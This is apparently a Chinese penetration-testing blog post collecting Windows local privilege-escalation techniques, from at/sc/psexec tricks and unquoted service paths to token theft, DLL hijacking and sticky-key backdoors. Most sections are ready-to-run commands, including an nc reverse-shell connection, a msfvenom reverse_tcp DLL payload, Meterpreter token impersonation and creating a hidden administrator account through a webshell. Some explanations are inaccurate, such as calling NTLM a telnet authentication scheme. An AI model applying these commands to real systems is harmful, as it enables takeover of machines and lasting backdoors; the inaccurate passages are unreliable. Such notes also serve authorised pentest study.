---
author: YOUZAI
title: 权限提升
date: 2023/06/20
categories:
 - Windows
tags:
 - 内网安全
---

## 系统权限

> system > administrator > users > webshell > guest

## 本地提权

### AT 命令提权

at 命令提权的原理：at 命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用的是 system 权限。

::: tip 适用版本

- [x] Windows2000
- [x] Windows2003
- [x] WindowsXP

:::

当我们拿到一个低权限的用户，通过 3389 端口远程连接上后，可以通过 at 命令来进行本地提权。

```shell
at 12:31 /interactive cmd (在19：39分生成一个交互式的 System 权限的 cmd)
```

![](/images/image20210518104242.png)

### SC 命令提权

SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。

::: tip 适用版本

- [x] Windows 7/8/03/08/12/16

:::

```shell
# 这个命令的意思是创建一个名叫syscmd的新的交互式的cmd服务
sc Create syscmd binPath= "cmd /K start" type= own type= interact
# 然后执行
sc start syscmd  # 就得到了一个system权限的cmd环境
```

### PC 命令提权

微软官方工具包： [https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools](https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools)

::: tip 适用版本

- [x] Windows2003 
- [x] Windows2008

:::

包含工具目录：

![](/images/image20210518104504.png)

```shell
psexec.exe -accepteula -s -i -d notepad.exe
```

在 windows2008 中：

![](/images/image20210518104544.png)

![](/images/image20210518104551.png)

## 不安全的服务权限配置

### 原理

及时正确引用了服务器路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多权限，例如，可以直接修改它导致重定向执行文件关键在于利用当前用户可以操作的服务。

### 提权

accesschk.exe 是微软官方文件，可以去官网直接下载：[https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

```shell
accesschk.exe -uwcqv "administrator" * #检测用户administrator可以操作的服务项，用户名可以替换成user
sc config "NewServiceName" binpath="C:\test.exe" #将服务执行的路径替换成提权文件
sc start "NewServiceName" #重新开启服务
```

::: warning 注意

如果出现<font color="red">Invalid account name:user</font>，此提权方法则无效

:::

## 不带引号服务路径

### 原理

当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按照字面解释它并执行，但是，如果服务的二进制路径未包含在引号中，则操作系统会执行找到空格分隔的服务路径的第一个实例。

### 提权

1. 检测引号服务路径：

```shell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

2. 利用路径制作文件并上传。
3. 启用服务或重启`sc start "服务名"`。
4. 利用 msf 监听，实现提权。

## 进程注入

### 原理

注入到`system`用户的进程，当管理员账户或其他账户注销后，后门仍然存在。可以理解为将`pinjector`注入到其他用户的进程里一起运行，进而同时拥有了对应的权限。

::: tip 适用版本

- [x] pinjector 进程注入工具针对-Windows2008以前的操作系统
- [x] pexec64 32 进程注入工具针对-Windows2008及以后的操作系统

:::

## 提权

使用工具列出当前操作系统的所有进程：

```shell
pinjector.exe -l
```

![](/images/image20210518152734.png)

可以看到不同的进程对应不同 PID 和用户。

执行：

```shell
pinjector.exe -p 600 cmd 2345
```

注入进程`pid`为`600`的进程，使用端口`2345`返回`cmd`，执行成功后在任务管理器里并没有多出进程，使用 kali：

```shell
nc 192.168.70.135 2345
```

反弹 shell 并提权为 system。

::: tip Windows2003&10

进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在 Windows2008 之前操作系统上.所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统。

:::

## 烂土豆配合令牌窃取

### 原理

烂土豆(Rotten Potato)提权是一个本地提权，是针对本地用户的，不能用于域用户。漏洞了解：MS16-075。

1. 欺骗“NT AUTHORITY\SYSTEM”账户通过 NTLM(NTLM 是指 telnet 的一种验证身份方式，即问询/应答身份验证协议，是 Windows NT 早期版本的标准安全协议)认证到我们控制的 TCP 终端。
2. 对这个认证过程使用中间人攻击（NTLM 重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的 Windows API 调用实现的。
3. 模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限（一定是要服务型用户）。

所以，一般从 web 拿到的 webshell 都是 IIS 服务器权限，是具有这个模仿权限的。

### 提权

```shell
msf
upload /root/potato.exe c:\Users\Public
cd c:\\Users\\Public
use incognito
list_tokens -u
execute -cH -f potato.exe
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

## 令牌窃取

### 原理

进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。

::: tip 适用版本

- [x] Windows xp professional sp3 和之前的版本
- [x] Windows server 2003 sp2 和之前的版本
- [x] Windows server 2003 x64 和 x64 sp2
- [x] Windows server 2003（用于基于Itanium的系统sp2和之前的版本）
- [x] Windows server 2008 x32 x64
- [x] Windows server 2008（用于基于Itanium的系统）
- [x] Windows Vista sp1 和之前的版本
- [x] Windows Vista x64 sp1 和之前的版本

:::

### 提权

```shell
user incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

### Kerberos 协议

在假冒令牌攻击中需要使用**kerberos**协议，所以在使用假冒令牌前，先来介绍 kerberos 协议。kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。

![](/images/image20210518151547.png)

客户端请求证书的过程如下：

1. 客户端向认证服务器 AS 发送请求，要求得到服务器的证书。
2. AS 收到请求后，将包含客户端密钥的加密证书响应发送给客户端，该证书包括服务器 ticket（包括服务器密钥加密的客户机身份和一份会话密钥）和一个临时加密密钥（又称会话密钥，session key）当然，认证服务器也会给服务器发送一份该证书，用来使服务器认证登陆客户端的身份。
3. 客户端将 ticket 传送到服务器上，服务器确认该客户端的话，便允许它登陆服务器。
4. 客户端登陆成功后，攻击者就可以通过入侵服务器获取客户端的令牌。

## Dll 劫持

### 原理

Windows 程序启动的时候需要 dll。如果这些 dll 不存在，则可以通过在应用程序要查找的位置防止恶意的 dll 来提权。通常，Windows 应用程序有其预定义好的搜索 dll 的路径，它会根据下面的顺序进行搜索：

1. 应用程序加载目录
2. C:\windows\System32
3. C:\windows\System
4. C:\windows

### 提权

* 信息收集：收集服务器中有哪些第三方运行的程序。
* 进程调试：在本地搭建环境，查找该程序在运行的时候调用了哪些dll，注意，这些dll不能是系统的dll。
* 制作名字相同的dll并上传替换。
* 重新启动应用，即可达到提权。

```shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x.x lport=xxxx -f dll > /opt/shell.dll
```

## 溢出漏洞

### 信息收集

利用 RCE 查看 systeminfo，使用项目查找漏洞提权。

### 工具利用

wesng：[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng) (可以用于web权限)

vulmap：[https://github.com/vulmon/Vulmap](https://github.com/vulmon/Vulmap) (不适合web权限)

windowsvulnscan：[https://github.com/chroblert/WindowsVulnScan](https://github.com/chroblert/WindowsVulnScan)

### 命令提权

下载 pstools，使用命令提权：

```shell
psexec.exe -accepteula -s -i -d notepad.exe # (nodepad.exe-->cmd.exe)
```

::: tip 示例

Windows server 2008 r2 溢出漏洞提权 => `CVE-2014-4113`

:::

## asp 提权

> 在 IIS 里，权限大小依次是 aspx > php >=asp。

aspx 默认能执行终端命令。

### 提权

得到 webshell 后查看是否存在组件 wscript.shell，如果存在，上传 cmd 至可执行目录，一般上传至回收站目录，即 c:\recycler,然后上传溢出漏洞 exp，如 iis6.exe,然后在 cmd 中执行该程序，带上参数，如ipconfig，最后创建一个用户，并将该用户放入管理员组。

```shell
"net user lhj lhj /add & net localgroup administrator lhj /add"
```

登录后即提权成功。

## aspx 提权

aspx 程序的权限比 asp 高（aspx 使用的是`.net`技术，IIS 默认不支持，aspnet 属于 user 组，asp 一般是 guest 权限），默认可以执行 cmd，如果 asp 不能执行，则上传 aspx 的程序至服务器实现提权。

## LPK 劫持提权

### 原理

如果同一个目录中存在 exe 和 lpk.dll 每当 exe 执行的时候就会被劫持。利用这个特性 可以把 lpk 提权的文件放到权限较高的程序 ，当 exe 运行时，lpk.dll 就可以进行提权。

### 触发条件

目录下存在 exe 文件被执行，他的特点是每个可执行文件运行之前都要加载该文件，Windows 系统是先判断当前文件目录是否存在此文件，如果目录下存在该文件则执行,如果不存在则会执行 system32 目录下的 dll。

::: tip 提示

lpk.dll 病毒是当下比较流行的一类病毒，而正常系统本身也会存在 lpk.dll 文件，这足以说明这类病毒的危险性。系统本身的 lpk.dll 文件位于 C:\WINDOWS\system32和C:WINDOWS\system\dllcache 目录下。

:::

### 提权

使用`T00ls Lpk Sethc v4`工具生成 lpk.dll,将该文件利用 webshell 上传至 system 权限运行的程序中，设置热键：

![](/images/image20210521151718.png)

相当于劫持了粘滞键。

等待用户重启服务器，再利用远程连接，按住 shift 键五次，弹出粘滞键窗口，同时按住 ctrl 键、a键、b键，输入密码即可获取后门：

![](/images/image20210521151956.png)
